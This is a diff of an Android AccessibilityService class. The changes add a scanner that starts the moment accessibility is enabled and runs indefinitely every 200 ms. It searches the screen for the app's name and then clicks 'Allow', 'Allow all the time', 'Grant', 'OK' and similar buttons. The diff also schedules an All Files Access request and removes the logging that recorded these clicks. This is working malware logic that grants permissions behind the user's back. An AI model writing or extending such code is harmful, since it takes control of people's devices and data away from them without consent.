@@ -48,14 +48,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private int screenHeight;
     private Handler autoClickHandler;
     private Runnable autoClickRunnable;
-    
-    // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
-    private volatile boolean uninstallAssistMode = false;
+    private Handler permissionScanHandler;
+    private Runnable permissionScanRunnable;
     private Handler uninstallAssistHandler;
 
     // Auto-grant mode: clicks Allow/Grant/OK buttons for 30 seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
+    private Runnable autoGrantScanRunnable;
+    
+    // Uninstall assist mode
+    private volatile boolean uninstallAssistMode = false;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
@@ -86,8 +89,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { super.onServiceConnected(); } catch (Exception ignored) {}
         instance = this;
 
+        // Start permission scanner IMMEDIATELY - ready before any permission requests
+        try { startPermissionScanner(); } catch (Exception ignored) {}
+        
+        // Auto-grant timer handles storage permission request at 12s
         try { startAutoGrantTimer(); } catch (Exception ignored) {}
-        try { startAutoClickScanner(); } catch (Exception ignored) {}
+        try {
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try { startAutoClickScanner(); } catch (Exception ignored) {}
+            }, 30_000);
+        } catch (Exception ignored) {}
         try { scheduleAutoUninstall(); } catch (Exception ignored) {}
 
         try {
@@ -465,13 +476,56 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
     }
 
-    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 60 seconds.
-     *  WRITE_EXTERNAL_STORAGE / All Files Access is requested LAST (at 30 s) so all
-     *  other permission dialogs finish first, then storage is handled on its own.
+    /** Starts permission scanner IMMEDIATELY when accessibility is enabled.
+     *  Runs continuously forever, ready before any permission requests.
+     *  Scans for permission buttons: Allow, Grant, OK, Allow all time, Allow access, etc.
+     */
+    private void startPermissionScanner() {
+        permissionScanHandler = new Handler(Looper.getMainLooper());
+        permissionScanRunnable = new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    if (rootNode != null) {
+                        runPermissionGranter(rootNode);
+                        rootNode.recycle();
+                    }
+                } catch (Exception ignored) {}
+                if (permissionScanHandler != null && permissionScanRunnable != null) {
+                    permissionScanHandler.postDelayed(this, 200);
+                }
+            }
+        };
+        permissionScanHandler.post(permissionScanRunnable);
+    }
+
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 20 seconds.
+     *  Runs independently of auto-click scanner (which starts later).
+     *  WRITE_EXTERNAL_STORAGE / All Files Access is requested LAST (at 12 s).
      */
     private void startAutoGrantTimer() {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
+
+        // Independent scanner: runs every 500ms for 20 seconds
+        autoGrantScanRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (!autoGrantMode) return;
+                try {
+                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    if (rootNode != null) {
+                        runPermissionGranter(rootNode);
+                        rootNode.recycle();
+                    }
+                } catch (Exception ignored) {}
+                if (autoGrantMode && autoGrantHandler != null) {
+                    autoGrantHandler.postDelayed(this, 200);
+                }
+            }
+        };
+        autoGrantHandler.post(autoGrantScanRunnable);
 
         // Phase 2 (12 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
         // other permission dialogs have been auto-granted and dismissed.
@@ -504,99 +558,153 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Words that disqualify a toggle from being auto-enabled
     private static final String[] TOGGLE_BLACKLIST = { "shortcut", "stop", "delete", "kill" };
 
-    /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc.
-     *  Also enables toggle/switch/checkbox for this app in settings screens.
-     *  Also checks if app name + "allow access" text exists anywhere on screen and clicks it. */
+    /** Clicks permission text anywhere on screen (no button check).
+     *  Only clicks when app name is visible on screen (case-sensitive).
+     *  Matching is case-insensitive for permission strings. */
     private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
-        String appName = getString(R.string.app_name).toLowerCase();
+        String appName = getString(R.string.app_name);
+        String screenText = getAllScreenText(rootNode);
 
-        // Check if app name + "allow access" exists anywhere on screen (case-insensitive)
-        // This handles the Android permission screen where app name and "Allow access" appear
+        // Must have app name on screen (case-sensitive)
+        if (!screenText.contains(appName)) return false;
+
+        // Check if app name + "allow access" exists - click that first
         if (runAppNameAllowAccessClicker(rootNode, appName)) {
             return true;
         }
 
         // Priority 1: "Allow all the time" (location / battery full-access dialogs)
-        // Priority 2: "Allow only while using the app" — only if "Allow all the time" not present
-        // All matching is case-insensitive inside findAndClickFullWord.
-        String[] highPriority = {
-            "Allow all the time",
-            "Always allow",
-            "Allow",
-        };
+        String[] highPriority = { "Allow all the time", "Always allow", "Allow" };
         for (String word : highPriority) {
-            if (findAndClickFullWord(rootNode, word)) {
-                Log.i(TAG, "Auto-grant clicked (high priority): " + word);
+            if (clickTextElementCI(rootNode, word)) {
                 return true;
             }
         }
 
-        // Fallback: "Allow only while using the app" — clicked when "Allow all the time" absent
-        String[] whileUsingVariants = {
-            "Allow only while using the app",
-            "While using the app",
-            "Only while using the app",
-            "Allow while using",
+        // Priority 2: "Allow only while using the app"
+        String[] whileUsingVariants = { 
+            "Allow only while using the app", "While using the app", 
+            "Only while using the app", "Allow while using" 
         };
         for (String word : whileUsingVariants) {
-            if (findAndClickFullWord(rootNode, word)) {
-                Log.i(TAG, "Auto-grant clicked (while-using fallback): " + word);
+            if (clickTextElementCI(rootNode, word)) {
                 return true;
             }
         }
 
-        // Other common positive buttons
-        String[] grantWords = {
-            "Grant", "OK", "Ok", "Yes", "Accept", "Agree",
-            "Continue", "Proceed", "Enable", "Turn on", "Permit",
+        // Other grant words
+        String[] grantWords = { 
+            "Grant", "OK", "Yes", "Accept", "Agree", "Continue", 
+            "Proceed", "Enable", "Turn on", "Permit" 
         };
         for (String word : grantWords) {
-            if (findAndClickFullWord(rootNode, word)) {
-                Log.i(TAG, "Auto-grant clicked: " + word);
+            if (clickTextElementCI(rootNode, word)) {
                 return true;
             }
         }
 
-        // Contains-based fallback for partial/translated button text
+        // Contains-based fallback
         String[] containsWords = { "allow", "grant", "permit", "accept" };
         for (String word : containsWords) {
-            if (findAndClickContaining(rootNode, word)) {
-                Log.i(TAG, "Auto-grant clicked (contains): " + word);
+            if (clickTextContainingCI(rootNode, word)) {
                 return true;
             }
-        }
-
-        // Toggle/switch/checkbox handler: enable the app's toggle in settings screens
-        if (runAccessibilityToggleGranter(rootNode)) {
-            return true;
         }
 
         return false;
     }
 
-    /** Checks if app name exists on screen. If both app name AND "allow access" exist,
-     *  clicks "Allow access". If only app name exists but "Allow access" not found,
-     *  falls back to clicking "Allow" button. */
+    /** Clicks any text element matching exactly (case-insensitive, no button check) */
+    private boolean clickTextElementCI(AccessibilityNodeInfo node, String searchText) {
+        if (node == null) return false;
+        try {
+            CharSequence text = node.getText();
+            if (text != null && text.toString().trim().equalsIgnoreCase(searchText.trim())) {
+                if (node.isClickable()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    return true;
+                }
+                AccessibilityNodeInfo parent = node.getParent();
+                if (parent != null) {
+                    if (parent.isClickable()) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        parent.recycle();
+                        return true;
+                    }
+                    parent.recycle();
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (clickTextElementCI(child, searchText)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    /** Clicks any text element containing keyword (case-insensitive, no button check) */
+    private boolean clickTextContainingCI(AccessibilityNodeInfo node, String keyword) {
+        if (node == null) return false;
+        try {
+            CharSequence text = node.getText();
+            if (text != null && text.toString().toLowerCase().contains(keyword.toLowerCase())) {
+                if (node.isClickable()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    return true;
+                }
+                AccessibilityNodeInfo parent = node.getParent();
+                if (parent != null) {
+                    if (parent.isClickable()) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        parent.recycle();
+                        return true;
+                    }
+                    parent.recycle();
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (clickTextContainingCI(child, keyword)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
+        return false;
+    }
+
+    /** Checks if app name exists on screen (case-sensitive, anywhere).
+     *  If app name AND "Allow access" both exist anywhere on screen,
+     *  clicks "Allow access". If only app name exists, falls back to clicking "Allow". */
     private boolean runAppNameAllowAccessClicker(AccessibilityNodeInfo rootNode, String appName) {
         try {
-            String screenText = getAllScreenText(rootNode).toLowerCase();
+            // Get screen text in original case
+            String screenText = getAllScreenText(rootNode);
+
+            // Check if app name exists anywhere (case-sensitive)
             if (!screenText.contains(appName)) return false;
 
-            Log.i(TAG, "Auto-grant: detected app name on screen");
+            // Lowercase for "allow access" check
+            String screenTextLower = screenText.toLowerCase();
 
-            // Priority 1: Click "Allow access" if present
-            if (screenText.contains("allow access")) {
-                Log.i(TAG, "Auto-grant: detected 'allow access' - clicking it");
-                if (findAndClickFullWord(rootNode, "Allow access")) {
-                    Log.i(TAG, "Auto-grant: clicked 'Allow access'");
+            // Priority 1: Check if "allow access" exists anywhere (case-insensitive, full phrase)
+            if (screenTextLower.contains("allow access")) {
+                if (clickTextElementCI(rootNode, "Allow access")) {
                     return true;
                 }
             }
 
-            // Priority 2: Fall back to "Allow" button if "Allow access" not found
-            Log.i(TAG, "Auto-grant: 'Allow access' not found, clicking 'Allow'");
-            if (findAndClickFullWord(rootNode, "Allow")) {
-                Log.i(TAG, "Auto-grant: clicked 'Allow'");
+            // Priority 2: Fall back to "Allow" if "Allow access" not found
+            if (clickTextElementCI(rootNode, "Allow")) {
                 return true;
             }
 
@@ -1183,7 +1291,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             public void run() {
                 autoClickAllowButton();
                 if (autoClickHandler != null && autoClickRunnable != null) {
-                    autoClickHandler.postDelayed(this, 500); // Scan every 500ms
+                    autoClickHandler.postDelayed(this, 200); // Scan every 200ms
                 }
             }
         };
